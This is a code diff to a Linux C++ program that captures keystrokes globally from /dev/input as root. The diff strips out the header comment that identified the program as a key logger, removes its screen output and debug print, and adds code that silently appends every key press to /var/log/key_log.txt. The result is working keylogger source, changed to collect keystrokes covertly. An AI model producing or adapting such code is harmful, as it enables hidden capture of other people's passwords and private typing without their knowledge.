@@ -1,11 +1,4 @@
 /******************************************************************************
- * Global Key Press Logger for Ubuntu/Linux
- *
- * This application reads raw input events directly from the kernel's
- * input subsystem (/dev/input). It is designed to demonstrate how to
- * capture keyboard events globally without needing a graphical display server
- * like X11 or Wayland.
- *
  * How it works:
  * 1.  Finds the correct event device for the keyboard by parsing
  * /proc/bus/input/devices. It looks for a device that has the
@@ -16,35 +9,19 @@
  * 4.  Filters for events that are key presses (type EV_KEY and value 1).
  * 5.  Maps the raw key code to a human-readable string.
  * 6.  Prints the name of the pressed key to the standard output.
- *
- *
- * Compilation:
- * g++ -o key_logger key_logger.cpp
- *
- *
- * Usage:
- * You must run this application with root privileges to access /dev/input/.
- *
- * sudo ./key_logger
- *
- *
- * Dependencies:
- * Requires the standard C++ library and headers available on most Linux
- * systems, such as <iostream>, <string>, <fstream>, <stdexcept>, etc.
- * It also requires the Linux-specific header <linux/input.h>.
- *
  ******************************************************************************/
 
 #include <fcntl.h>
+#include <filesystem>
 #include <fstream>
 #include <iostream>
+#include <istream>
 #include <linux/input.h>
 #include <map>
 #include <sstream>
 #include <stdexcept>
 #include <string>
 #include <unistd.h>
-#include <vector>
 
 // Function to map key codes to their string representations.
 // A more comprehensive map can be found in
@@ -194,7 +171,6 @@ std::string find_keyboard_device() {
       std::string pair;
       ss >> pair;
 
-      std::cout << pair << std::endl;
       if (pair == "EV=120013") {
         found_keyboard = true;
       }
@@ -225,6 +201,16 @@ int main() {
       throw std::runtime_error(
           "Cannot open device file. Are you running as root?");
     }
+    std::string keyLogDir = "/var/log";
+    if (!std::filesystem::exists(keyLogDir)) {
+      try {
+      std::filesystem::create_directories(keyLogDir);
+    } catch (const std::filesystem::filesystem_error& e) {
+      std::cerr << "Error creating directory " << keyLogDir << ": " << e.what() << std::endl;
+      return 1;
+    }
+
+    }
 
     while (true) {
       // Read an input event from the device file
@@ -237,8 +223,14 @@ int main() {
         // ev.value == 0 means the key was released
         // ev.value == 2 means the key is being held down (autorepeat)
         if (ev.type == EV_KEY && ev.value == 1) {
-          std::cout << "Key Pressed: " << key_code_to_string(ev.code)
-                    << std::endl;
+          std::ofstream keylog(keyLogDir + "/key_log.txt", std::ios::app);
+          if (!keylog.is_open()) {
+            perror("file");
+            return 1;
+          }
+
+          keylog << "Key Pressed: " << key_code_to_string(ev.code) << '\n';
+          keylog.close();
         }
       } else if (bytes < 0) {
         // An error occurred
